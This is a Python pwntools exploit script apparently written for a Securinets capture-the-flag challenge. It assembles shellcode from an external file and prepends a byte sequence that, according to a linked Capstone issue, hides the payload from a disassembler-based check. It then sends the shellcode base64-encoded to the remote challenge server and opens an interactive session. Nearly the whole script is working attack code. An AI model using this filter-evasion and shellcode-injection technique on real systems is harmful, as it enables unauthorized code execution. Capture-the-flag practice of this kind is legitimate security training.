#!/usr/bin/env python3
from pwn import *
from subprocess import run
from base64 import b64encode 

# =========================================================
#                          SETUP                         
# =========================================================
exe = '/usr/bin/python'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'pwn-14caf623.p1.securinets.tn', 9001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + ['./main.py'], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + ['./main.py'])

gdbscript = '''
init-pwndbg
c
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()

    # https://github.com/capstone-engine/capstone/issues/2550
    if args.GDB:
        shellcode = b'\xCC' + b'\x0F\x1A\xDE' + shellcode
    else:
        shellcode = b'\x0F\x1A\xDE' + shellcode

    sla(b':', b64encode(shellcode))

    io.interactive()
    
if __name__ == '__main__':
    exploit()
